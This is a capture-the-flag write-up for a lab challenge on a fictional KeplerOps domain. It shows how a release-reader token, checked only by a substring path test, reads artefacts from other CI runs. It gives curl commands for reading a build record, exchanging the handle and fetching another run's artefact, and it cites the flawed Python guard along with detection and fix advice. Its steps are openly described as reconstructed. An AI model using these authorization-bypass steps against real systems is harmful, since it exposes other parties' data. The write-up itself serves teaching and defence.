# K29.1 — The build record's principal

> **Category:** 2. KeplerOps · **Points:** 100 · **Difficulty:** medium
> **Solved by:** team agent

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Over-broad capability — a limited "release-reader" principal accepted by a path test matching *any* `/artifacts/` URL rather than the record it was minted for |
| **Tools** | `curl`, the report worker API, the cloud API token exchange |
| **Attack surface** | `https://review.keplerops.test/api/build-records/{build_id}` → `/api/runs/{run_id}/artifacts/{name}` |
| **Prerequisite** | Developer credentials for the build-record read; a workspace token to exchange its handle |
| **Flag** | accepted, value not recorded |

**What you are about to read:** how a limited release principal is meant to work, and how one
substring comparison widens it to every run's retained artefacts.

## Objective

> Recover the limited release principal behind the protected build dossier and establish what it
> can actually access.

Identify the principal and its handle, then measure what the handle really opens.

## Background you need

- A **build record** indexes a CI run. Dossiers are protected: the developer account can see the
  record exists, not necessarily everything inside.
- The pattern is a **capability handle**: the record returns an opaque `exchange_handle`, traded
  for a token bound to a named principal and audience — the scope is declared once.
- That scope only holds where the consumer enforces it, and `audience` matters: a release-reader
  token is rejected by services expecting a workload identity. Here the consumer is the
  run-artefact worker, whose source documents its own check.

## Walkthrough

### 1. Recon — read the dossier, not the artefact

```bash
curl -sS --socks5-hostname 127.0.0.1:1080 --cacert /home/kali/ctf/ca.crt \
  -u 'rowan.ito:<fk_developer token>' \
  https://review.keplerops.test/api/build-records/BLD-REL-742
```

The record states its classification (release dossier), status, the **limited principal** and its
handle: not your developer account or a workload identity, but a reader minted for release records.

### 2. Exchange the handle for its token

```bash
curl -sS ... -X POST https://cloud-api.keplerops.test/api/workspaces/current/token-exchange
curl -sS ... -X POST https://cloud-api.keplerops.test/api/token-exchange/release-reader \
  -H 'Content-Type: application/json' -d '{"exchange_handle":"fk_release_reader_…"}'
```

The subject is the release principal, its purpose reading the dossier's artefacts — though
delivery rejects it and wants developer Basic auth.

### 3. Finding the flaw — the guard is a substring test

The run-artefact worker carries its own authorization block. This excerpt from the retained `ci.py`
is the whole bug:

```python
# K29.1: run artifacts can also be accessed with the release-reader exchange handle.
_release_reader_auth = (
    self.headers.get("Authorization") == f"Bearer {RELEASE_READER_TOKEN}"
    and "/artifacts/" in path
    and path.sta…
)
```

Two details: the comparison is against **one** module-level token, not the record the handle was
minted for; and the path test is substring containment (`"/artifacts/" in path`) rather than a
prefix or ownership check — so any URL containing `/artifacts/` satisfies it.

### 4. What it can actually access

```bash
curl -sS --socks5-hostname 127.0.0.1:1080 --cacert /home/kali/ctf/ca.crt \
  -H "Authorization: Bearer $RELEASE_READER" \
  https://review.keplerops.test/api/runs/BLD-1842/artifacts/integration-review-input-v3.json
```

A `200` for another run's artefact is the finding: the scope is any retained artefact with
`/artifacts/` in its path, far wider than "this release dossier".

### 5. Getting the flag

Accepted by a team agent; the value was not recorded. Evidence is the principal and its reach.

## Why this works (the vulnerability explained)

The bug class is **capability scope loss at the enforcement point**.

- **Minting is not enforcement.** The exchange declares principal, audience and purpose; the
  consumer must check purpose against object. Here it checks a magic string and a URL fragment.
- **Substring matching is not a path check.** `"/artifacts/" in path` is satisfied by any run or
  query value containing it. Correct code resolves the path, then asserts that the run id equals
  the record's build id under the principal's grant.
- **One shared secret replaces per-object grants.** Holders are indistinguishable and unrevocable
  per object; rotation breaks everyone and no audit line ties a read to its dossier.


## Detection and fix

- **Detect:** release-reader reads where the run differs from the handle's record; one token across
  many build ids; artefacts of runs with no release record.
- **Fix:** put an explicit object claim (build id, collection) in the token and enforce it
  server-side: resolve the path, then compare. Use canonicalised prefix checks, per-object
  revocation, and log principal plus claimed/actual object per read.

## Notes and dead ends

- Evidence is thin: the retained material is the description plus the worker-source excerpt above.
  Steps 1–4 are **reconstructed**; no response body or flag value was kept.
- The handle is not general-purpose: delivery rejects it and requires developer Basic auth, so do
  not spend time widening it there.
- The dossier gives the *principal*; other runs' artefacts are where the deviation is measured.
